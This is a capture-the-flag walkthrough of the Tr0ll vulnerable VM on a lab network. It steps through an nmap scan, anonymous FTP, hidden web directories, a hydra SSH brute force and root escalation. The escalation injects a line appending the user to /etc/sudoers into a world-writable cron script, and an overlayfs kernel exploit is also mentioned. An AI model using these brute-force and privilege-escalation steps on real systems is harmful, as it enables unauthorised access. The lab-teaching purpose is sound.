# Tr0ll

![](https://i.imgur.com/1JR58TI.png)
Host is `192.168.227.132`
![](https://i.imgur.com/jlZhZyO.png)
Victim is `192.168.227.136`
`nmap -sS -sV -A -p- -oN NampTr0llLv1.txt 192.168.227.136`
![](https://i.imgur.com/bpl6vLv.png)
Here we got three port open: Anonymous login allowed FTP/21, OpenSSH 6.6.1p1/22, Apache httpd 2.4.7/80

Let's first try ftp, which seems the challenge's entry.
`ftp 192.168.227.136` and account might be `Anonymous`.
```
ls
get lol.cap
```
![](https://i.imgur.com/K6iHTbg.png)

`wireshark lol.pcap`
![](https://i.imgur.com/MJUeEl3.png)

We found there something interesting: `secret_stuff.txt`.

![](https://i.imgur.com/AyBGzsj.png)
The file actually contain those message, seems nothing help. That might be a stego trick or words misc here.

`http://192.168.227.136/secret_stuff.txt`
![](https://i.imgur.com/4GfsNKI.png)

Okay, there's no secret_stuff.txt on the Apache service.

How about `sup3rs3cr3tdirlol` it mention in the message?
`http://192.168.227.136/sup3rs3cr3tdirlol`
![](https://i.imgur.com/DQbSrFO.png)

Let's download it and find more clue in it.
`file roflmao`
![](https://i.imgur.com/EX2P5GP.png)
A ELF binary.

`binwalk roflmao`
![](https://i.imgur.com/DjxuGSO.png)
Nothing appended.

`foremost roflmao`
![](https://i.imgur.com/YBptgQC.png)

![](https://i.imgur.com/rUQOkVz.png)
Nothing.

`strings roflmao`
![](https://i.imgur.com/0f0dHHr.png)
Seems a static strings `find address 0x0856BF to proceed` in this ELF executable.
Let's chmod the binary and exec it.

`chmod +x roflmao`
`./roflmao`
![](https://i.imgur.com/dX2PXSu.png)

As these not a service on the target's port, this might not be a pwn challenge, so it might be a stego misc here.
Try `0x0856BF`
`http://192.168.227.136/0x0856BF`
![](https://i.imgur.com/1hil4yQ.png)

Here we got two folder.

![](https://i.imgur.com/nZUOtRq.png)

![](https://i.imgur.com/iU07pVg.png)
And there's Account list `which_one_lol.txt` in `/good_luck` and password `Pass.txt` in `/this_folder_contains_the_password`.

![](https://i.imgur.com/nRaliep.png)

![](https://i.imgur.com/u0VGEiV.png)

Let's try `hydra -L which_one_lol.txt -P Pass.txt 192.168.227.136 ssh`
![](https://i.imgur.com/4e9Tb6i.png)

Failed, that means `Good_job_:)` is not the password, trick again.
Let's set `pass.txt` as password and try again: `hydra -L which_one_lol.txt -p Pass.txt 192.168.227.136 ssh`
![](https://i.imgur.com/K8ooOo7.png)

I feel not good after these words tricks...
`ssh overflow@192.168.227.136`
![](https://i.imgur.com/2vCWI1D.png)

Wait, what?
![](https://i.imgur.com/IWmjJfQ.png)

Great, it kicks me regularly.
`id & whoami & uname -a`
![](https://i.imgur.com/COYmyRw.png)

According there's scheduled task to kick login account, find the  `/etc/crontab` to see the task.
`cat /etc/crontab`
![](https://i.imgur.com/gnCAaAu.png)

Okay, it fail, try to see log.
`cat /var/log/cronlog`
![](https://i.imgur.com/HYK6FjW.png)

The script which used to kick us out is `cleaner.py`, try to find the script's location.
`find / -name cleaner.py 2>/dev/null`
![](https://i.imgur.com/LkqI3X3.png)

Now we got two way to PoE, one is to overwrite the `cleaner.py`, another is exploit of old linux kernel:
![](https://i.imgur.com/6Q7jrWI.png)

![](https://i.imgur.com/F1aPV1l.png)

It's a `overlayfs` vulnerability.
![](https://i.imgur.com/dX1Dp5S.png)
After you copy then compile the exploit code and execute it, you might become `root`.
Go to `/root` to cat the flag.
![](https://i.imgur.com/tCE4Ynu.png)

Or replace the command in `cleaner.py` with `os.system('echo "overflow ALL=(ALL:ALL) ALL " >> /etc/sudoers')`
![](https://i.imgur.com/MFxQhuv.png)

![](https://i.imgur.com/3AqN4Zt.png)

After diconnect, the script might be executed.
Reconnect to the machine, and simply use `sudo su` to become root.
![](https://i.imgur.com/aQG3W0Q.png)

![](https://i.imgur.com/dtT1Lzu.png)
